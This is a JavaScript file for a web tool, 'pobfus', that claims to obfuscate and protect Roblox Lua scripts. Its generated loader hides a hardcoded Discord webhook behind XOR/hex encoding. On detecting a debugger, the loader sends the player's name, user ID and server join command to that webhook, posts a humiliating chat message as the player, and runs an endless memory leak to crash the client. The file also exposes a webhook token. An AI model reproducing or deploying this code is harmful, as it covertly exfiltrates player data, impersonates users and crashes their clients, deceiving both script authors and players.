const SITE_DOMAIN = "tenringsofdoom1x.github.io"; 
const WEBHOOK = "https://discord.com/api/webhooks/1480014350755434558/lVhs2_YcG-LuG7zLjWSwBGzZPk2f1RF1fmRC5P7zZdgzJfX_fq2sdPAD81T4hOqMvfT2";

const POBFUS_ENGINE = `
return function(data, hook, key, report_name, script_identity)
    local decode = function(d, k)
        local r = ""
        for x = 1, #d, 2 do
            r = r .. string.char(bit32.bxor(tonumber(d:sub(x, x+1), 16), k))
        end
        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        r = r:gsub('[^'..b..'=]', '')
        return (r:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end

    local function big_boom()
        local url = decode(hook, key)
        local p = game:GetService("Players").LocalPlayer
        pcall(function()
            local payload = {["embeds"]={{
                ["title"]="🚨 POBFUS: LEAK DETECTED",
                ["description"]="**Project:** " .. script_identity .. "\\n**User:** "..p.Name.." ("..p.UserId..")\\n**Join:** \`game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."', p)\`",
                ["color"]=16711680,
                ["footer"]={["text"]="pobfus Support System | Grok-Resistant"},
                ["thumbnail"]={["url"]="https://www.roblox.com/headshot-thumbnail/image?userId="..p.UserId.."&width=420&height=420&format=png"}
            }}}
            game:GetService("HttpService"):PostAsync(url, game:GetService("HttpService"):JSONEncode(payload))
        end)
        pcall(function() game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I have a debugger, pobfus found me, poor me") end)
        local leak = {}
        task.spawn(function() while true do for i=1,12000 do table.insert(leak, Vector3.new(i,i,i)) end task.wait() end end)
    end

    if (debug and debug.getregistry and #debug.getregistry() > 65000) or (isexecutorclosure and isexecutorclosure(loadstring)) then
        big_boom()
    else
        local s = decode(data, key)
        local f = loadstring(s)
        if f then setfenv(f, getfenv()) f() end
    end
end`;

document.getElementById('goBtn').onclick = () => {
    const raw = document.getElementById('input').value.trim();
    const sName = document.getElementById('scriptName').value.trim() || "pobfus_build";
    if (!raw) return alert("Source is required.");
    
    const k = Math.floor(Math.random() * 90) + 10;
    const fold = (str) => {
        let b64 = btoa(unescape(encodeURIComponent(str)));
        return b64.split('').map(c => (c.charCodeAt(0) ^ k).toString(16).padStart(2, '0')).join('');
    };

    const err_msg = fold(`[pobfus]: Engine Ignition Failure at ${SITE_DOMAIN}`);

    let loader = `--[[ protected by pobfus | developer internal build ]]\n`;
    loader += `local _D = "${fold(raw)}"\n`;
    loader += `local _H = "${fold(WEBHOOK)}"\n`;
    loader += `local _K = ${k}\n`;
    loader += `local _R = "${SITE_DOMAIN}"\n`;
    loader += `local _I = "${sName}"\n`;
    loader += `local _W = "${err_msg}"\n\n`; 
    
    loader += `local _E = [====[\n${POBFUS_ENGINE}\n]====]\n\n`;
    
    loader += `local s, r = pcall(loadstring(_E))\n`;
    loader += `if s and r then r()(_D, _H, _K, _R, _I) else \n`;
    loader += `    local d = function(t, k) local r = "" for x = 1, #t, 2 do r = r .. string.char(bit32.bxor(tonumber(t:sub(x, x+1), 16), k)) end return r end\n`;
    loader += `    warn(d(_W, _K))\n`;
    loader += `end`;

    document.getElementById('output').value = loader;
    document.getElementById('dlBtn').disabled = false;
    document.getElementById('history').innerText = "Instance: " + sName + " built at " + new Date().toLocaleTimeString();
};

document.getElementById('copyBtn').onclick = () => {
    const out = document.getElementById('output');
    out.select();
    document.execCommand('copy');
    alert("Copied!");
};

document.getElementById('dlBtn').onclick = () => {
    const blob = new Blob([document.getElementById('output').value], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `pobfus_protected.lua`;
    a.click();
};
